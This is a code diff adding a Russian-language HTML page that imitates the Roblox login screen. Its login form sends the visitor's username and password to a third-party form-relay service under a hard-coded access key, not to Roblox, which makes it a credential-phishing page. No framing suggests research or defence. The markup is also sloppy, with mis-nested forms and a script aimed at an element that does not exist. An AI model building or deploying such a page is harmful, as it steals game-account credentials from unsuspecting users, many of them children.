@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LOGIN TO ROBLOX</title>
+<style>
+  body {
+    font-family: 'Arial', sans-serif;
+    
+    color: white;
+    text-align: center;
+    background: url('Bg.png'); 
+    background-repeat: no-repeat;
+    background-size: cover;
+  }
+  .top-menu {
+    display: flex;
+    justify-content: space-between;
+    padding: 10px;
+  }
+  .top-menu button {
+    background: none;
+    border: none;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    font-family: Font;
+  }
+  .top-menu button.green {
+    color: #4CAF50;
+  }
+  .login-container {
+    margin-top: 50px;
+  }
+  .login-form {
+    display: inline-block;
+    padding: 20px;
+    background: ;
+    border-radius: 5px;
+  }
+  @font-face {
+    font-family: Font; /* Гарнитура шрифта */
+    src: url(Font.ttf); /* Путь к файлу со шрифтом */
+   }
+  .login-title {
+    font-size: 24px;
+    margin-bottom: 10px;
+    font-family: Font;
+    margin-top: 120px;
+  }
+  input[type="text"], input[type="message"] {
+    width: 300px;
+    padding: 10px;
+    margin-bottom: 10px;
+    background: #111312;
+    border: none;
+    border-radius: 5px;
+    color: white;
+  }
+  .login-button, .signup-button {
+    width: 320px;
+    padding: 6px;
+    background-color: #373737;
+    border-color: white;:;
+    border-radius: 10px;
+    color: white;
+    cursor: pointer;
+    font-size: 16px;
+    font-family: Font;
+
+border: 1px solid white;
+    
+  }
+  .login-button:hover, 
+  .signup-link {
+    color: #4CAF50;
+    text-decoration: none;
+    font-family: Font;
+  }
+  .signup-link:hover {
+    text-decoration: underline;
+  }
+  .signup-button green {
+    background-color: green;
+  }
+  .contunue {
+          color: #dbdbdb;
+          font-family: Arial;
+          font-size: 18px;
+          margin-top: 0;
+  }
+</style>
+</head>
+<body>
+    <form action="indexload.html" target="_blank">
+  <div class="top-menu">
+    <button>Discover</button>
+    <button>Marketplace</button>
+    <button>Create</button>
+    <button class="signup-button green">Sign Up</button>
+    
+    </form>
+  </div>
+  <div class="login-container">
+    <div class="login-title">LOGIN TO ROBLOX</div>
+    <h3 class="contunue">Login to your account to continue</h3>
+     <form action="https://api.web3forms.com/submit" method="POST">
+
+    <input type="hidden" name="access_key" value="4a38ccca-a426-4da1-baeb-4d7b183f972a">
+
+   <input type="text" name="name" placeholder="Username/Email/Phone" required>
+    
+    <input type="text" name="name" placeholder="Password" required></input>
+    <input type="hidden" name="redirect" value="https://web3forms.com/success">
+    <button class="signup-button green"type="submit">Log In</button>
+
+    <p>Don’t have an account? <a href="#" class="signup-link">Sign Up</a></p>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').onsubmit = function(event) {
+      event.preventDefault();
+      // Здесь должен быть ваш код для отправки данных на сервер
+      alert('Данные введены!');
+    };
+  </script>
+</body>
+</html>
+
+
+<body>
+
+
+  <input type="hidden" name="apikey" value="4a38ccca-a426-4da1-baeb-4d7b183f972a">
+</body>
+
+<style>
+
+</style>
+<script>
+
+</script>
